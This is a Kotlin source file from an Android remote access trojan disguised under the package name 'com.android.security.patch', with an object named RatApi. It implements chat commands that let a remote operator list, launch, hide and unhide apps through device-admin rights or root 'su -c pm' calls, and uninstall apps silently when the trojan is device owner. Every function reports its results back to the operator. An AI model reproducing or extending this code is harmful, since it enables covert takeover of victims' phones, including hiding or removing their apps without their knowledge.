package com.android.security.patch.commands

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import com.android.security.patch.AdminReceiver
import com.android.security.patch.RatApi

object Apps {

    /** /apps [filter] — list user-installed packages */
    fun listApps(ctx: Context, chatId: Long, args: Array<String>) {
        val filter = args.joinToString(" ").lowercase().trim()
        com.android.security.patch.Pager.openApps(ctx, chatId, filter)
    }

    /** /app_open <pkg> */
    fun openApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_open &lt;pkg&gt;", chatId); return
        }
        try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
            if (intent == null) {
                RatApi.sendMessage(ctx, "no launcher for $pkg", chatId); return
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            RatApi.sendMessage(ctx, "opened $pkg", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    /** /app_hide <pkg> — hide via admin */
    fun hideApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_hide pkg", chatId); return
        }
        if (pkg == ctx.packageName) {
            RatApi.sendMessage(ctx, "TOLAK: gak bisa hide apk sendiri", chatId); return
        }
        Thread {
            try {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                if (dpm.isAdminActive(AdminReceiver.component(ctx))) {
                    val ok = try { dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, true) } catch (_: Throwable) { false }
                    if (ok) { RatApi.sendMessage(ctx, "hidden (admin): " + pkg, chatId); return@Thread }
                }
                val p1 = ProcessBuilder("su", "-c", "pm disable " + pkg).redirectErrorStream(true).start()
                p1.inputStream.bufferedReader().readText(); p1.waitFor()
                val p2 = ProcessBuilder("su", "-c", "pm hide " + pkg).redirectErrorStream(true).start()
                p2.inputStream.bufferedReader().readText(); p2.waitFor()
                RatApi.sendMessage(ctx, "hidden via root: " + pkg, chatId)
            } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: " + e.message, chatId) }
        }.start()
    }

    fun showApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_show pkg", chatId); return
        }
        Thread {
            try {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                if (dpm.isAdminActive(AdminReceiver.component(ctx))) {
                    val ok = try { dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, false) } catch (_: Throwable) { false }
                    if (ok) { RatApi.sendMessage(ctx, "shown (admin): " + pkg, chatId); return@Thread }
                }
                val p1 = ProcessBuilder("su", "-c", "pm enable " + pkg).redirectErrorStream(true).start()
                p1.inputStream.bufferedReader().readText(); p1.waitFor()
                val p2 = ProcessBuilder("su", "-c", "pm unhide " + pkg).redirectErrorStream(true).start()
                p2.inputStream.bufferedReader().readText(); p2.waitFor()
                RatApi.sendMessage(ctx, "shown via root: " + pkg, chatId)
            } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: " + e.message, chatId) }
        }.start()
    }

    /** /app_uninstall <pkg> — silent kalau device owner, prompt kalau engga */
    fun uninstallApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_uninstall &lt;pkg&gt;", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try {
            if (AdminReceiver.isDeviceOwner(ctx)) {
                dpm.deletePackage(AdminReceiver.component(ctx), pkg, null)
                RatApi.sendMessage(ctx, "silent uninstall: $pkg", chatId)
            } else {
                val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
                RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)
            }
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }
}